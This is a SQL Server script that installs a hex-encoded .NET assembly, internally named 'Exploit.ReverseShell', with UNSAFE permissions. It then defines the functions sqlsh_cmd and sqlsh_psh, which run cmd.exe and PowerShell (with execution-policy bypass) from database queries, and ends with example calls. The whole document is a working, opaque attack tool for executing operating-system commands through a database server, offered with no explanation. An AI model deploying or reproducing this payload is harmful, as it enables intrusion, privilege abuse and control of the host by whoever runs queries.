
-- Create assembly
drop function if exists dbo.sqlsh_cmd
GO
drop function if exists dbo.sqlsh_psh
GO

DROP ASSEMBLY IF EXISTS [Sqlsh]
GO
CREATE ASSEMBLY [Sqlsh] FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300E8B72D940000000000000000E00022200B0130000010000000060000000000001A2F0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000C52E00004F000000004000006803000000000000000000000000000000000000006000000C000000482E0000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000200F0000002000000010000000020000000000000000000000000000200000602E7273726300000068030000004000000004000000120000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001600000000000000000000000000004000004200000000000000000000000000000000F92E000000000000480000000200050000230000480B00000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000133004005400000001000011730F00000A0B2B3B06281000000A7201000070281100000A281200000A2D2406720D000070281000000A7215000070281300000A281200000A2D0807066F1400000A26026F1500000A250A2DBB076F1600000A2A13300200C500000002000011730F00000A26731700000A0A066F1800000A027B010000046F1900000A066F1800000A027B020000046F1A00000A066F1800000A176F1B00000A066F1800000A176F1C00000A066F1800000A166F1D00000A066F1800000A176F1E00000A066F1800000A176F1F00000A066F1800000A176F2000000A066F2100000A26066F2200000A027B030000046F2300000A066F2200000A72230000706F2300000A066F2200000A6F2400000A066F2500000A2801000006066F2600000A280100000673070000062A0000001B3003003E000000030000110F00282700000A2C02022A00722D000070723D0000700F00282800000A730600000628020000066F080000060ADE0D6F2900000A732A00000A0ADE00062A00000110000000000C00232F000D150000011B3003003E000000030000110F00282700000A2C02022A00723F000070725D0000700F00282800000A730600000628020000066F080000060ADE0D6F2900000A732A00000A0ADE00062A00000110000000000C00232F000D150000011E02282B00000A2A7202282B00000A02037D0100000402047D0200000402057D030000042A00000013300400330000000400001102282B00000A282C00000A0A020606036F2D00000A6F2E00000A7D04000004020606046F2D00000A6F2E00000A7D050000042A00133003004E00000000000000027B050000046F2F00000A2D0C027B04000004732A00000A2A027B040000046F2F00000A2D0C027B05000004732A00000A2A027B050000047277000070027B04000004281300000A732A00000A2A000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000D0030000237E00003C040000F404000023537472696E677300000000300900007C00000023555300AC090000100000002347554944000000BC0900008C01000023426C6F620000000000000002000001571502000902000000FA013300160000010000001D000000040000000500000008000000090000002F0000000E0000000400000001000000030000000200000000008B0201000000000006008501B3030600F201B3030600B90081030F00D30300000600E100C10206006801C10206004901C1020600D901C1020600A501C1020600BE01C1020600F800C1020600CD0094030600AB00940306002C01C10206001301370206001D04BA020600FC02130006001B03B4040A00000481030E005D02E2030600D302BA0206002E02B40406003304BA0206007302BA020600090313000A00EB0281030A006D008103060029031300060036031300000000000A00000000000100010001001000970224044100010001000500100044000000410001000600050010002C04000041000400070006005800870006000C04870006005102870006004C04870006007303870050200000000091003A008A000100B0200000000091001C02900002008421000000009600320097000300E021000000009600A402970004003C220000000086186D030600050044220000000086186D039E00050064220000000086186D03A5000800A4220000000086005B02AB000A00000001001403000001003600000001003F04000001003F04000001005800000002000C04000003005102000001005304000002007A0309006D03010011006D03060019006D030A0029006D03100031006D03100039006D03100041006D03100049006D03100051006D03100059006D03100061006D03150069006D03100071006D03100079006D03100091006D030600B900D3042000C10016042400C100E8042A00C10016043000910096003700C9008D003D00810067023D0099006D0306009900DD024600D10080001000D10008041000D1005D004B00D100C0041500D10010021500D1006C041500D10099041500D1005303150099004604510099005A045500E900A1001000E9007A020600990086045A00990041035A00A100AF025100A10024023D00A9004C003D00A1006D03100081006D030600B10001006900B100F7036E00B10070027400C10080027A002E000B00B0002E001300B9002E001B00D8002E002300E1002E002B00EE002E003300EE002E003B00EE002E004300E1002E004B00F4002E005300EE002E005B00EE002E0063000C012E006B0036012E00730043011A0041005F006400048000000100000000000000000000000000240400000400000000000000000000007E002900000000000400000000000000000000007E00BA02000000000400000000000000000000007E001D0000000000030002000400020000000000006765745F55544638003C4D6F64756C653E0053797374656D2E494F0053797374656D2E44617461006D73636F726C696200436D6400636D640052656164546F456E6400436F6D6D616E64006765745F4D6573736167650046696C65007365745F57696E646F775374796C650050726F6365737357696E646F775374796C65007365745F46696C654E616D6500526561644C696E6500417070656E644C696E650057726974654C696E6500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C45786563757465006765745F56616C756500456E636F64696E670053797374656D2E52756E74696D652E56657273696F6E696E6700436D64537472696E6700746F53716C537472696E6700546F537472696E6700476574537472696E6700466C757368006765745F4C656E677468004578706C6F69742E646C6C00526576657273655368656C6C00506F7765727368656C6C006765745F49734E756C6C0053797374656D0053797374656D2E5265666C656374696F6E00457863657074696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D52656164657200546578745265616465720072656164657200537472696E674275696C6465720053747265616D5772697465720054657874577269746572006765745F5374616E646172644572726F72007365745F52656469726563745374616E646172644572726F72002E63746F7200737464657272007374726572720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730047657442797465730050726F63657373007365745F417267756D656E747300436F6E636174004F626A656374004578706C6F697400526573756C7400456E7669726F6E6D656E7400736372697074005374617274007374646F7574007374726F7574006765745F5374616E64617264496E707574007365745F52656469726563745374616E64617264496E707574006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053797374656D2E54657874007365745F4372656174654E6F57696E646F77006765745F43757272656E744469726563746F7279006F705F457175616C69747900000B3E0065007800690074000007500053002000000D3E002000650078006900740000096500780069007400000F63006D0064002E006500780065000001001D70006F007700650072007300680065006C006C002E0065007800650000192D006500780065006300200062007900700061007300730001030A00000090DAE899AA6029469FD6A5BB465C51C400042001010803200001052001011111042001010E04200101020507020E12490300000E0500020E0E0E050002020E0E0600030E0E0E0E05200112490E0320000E040701124D042000126905200101116D03200002042000127104200012450407011151040701125904000012590520011D050E0520010E1D050320000808B77A5C561934E08902060E0500010E12450600011210120C06000111511151062003010E0E0E052002010E0E04200011510801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000C0100074578706C6F6974000005010000000017010012436F7079726967687420C2A920203230313900002901002436386138346135362D393739352D346363382D383632652D61336137376133306565663200000C010007312E302E302E3000004701001A2E4E45544672616D65776F726B2C56657273696F6E3D76342E300100540E144672616D65776F726B446973706C61794E616D65102E4E4554204672616D65776F726B203400000000000E967E8A000000000200000045000000802E0000801000000000000000000000000000001000000000000000000000000000000052534453E19EFB9ABA214F4792E2D89A477E2F62010000005A3A5C53514C205368656C6C5C4578706C6F69745C6F626A5C52656C656173655C4578706C6F69742E70646200ED2E00000000000000000000072F0000002000000000000000000000000000000000000000000000F92E0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000000000FF25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000000C03000000000000000000000C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0046C020000010053007400720069006E006700460069006C00650049006E0066006F0000004802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D0065000000000000000000380008000100460069006C0065004400650073006300720069007000740069006F006E00000000004500780070006C006F00690074000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000038000C00010049006E007400650072006E0061006C004E0061006D00650000004500780070006C006F00690074002E0064006C006C0000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003100390000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000040000C0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000004500780070006C006F00690074002E0064006C006C000000300008000100500072006F0064007500630074004E0061006D006500000000004500780070006C006F00690074000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C0000001C3F00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET=UNSAFE;
GO

-- Add functions to use assembly
CREATE FUNCTION dbo.sqlsh_cmd(@cmd NVARCHAR(max)) RETURNS NVARCHAR(max) EXTERNAL NAME [Sqlsh].[Exploit.ReverseShell].[Cmd]
GO
CREATE FUNCTION dbo.sqlsh_psh(@cmd NVARCHAR(max)) RETURNS NVARCHAR(max) EXTERNAL NAME [Sqlsh].[Exploit.ReverseShell].[Powershell]
GO

-- Examples:
-- select dbo.sqlsh_cmd('ipconfig') AS output;
-- select dbo.sqlsh_psh('Get-NetIpConfiguration -All') AS output;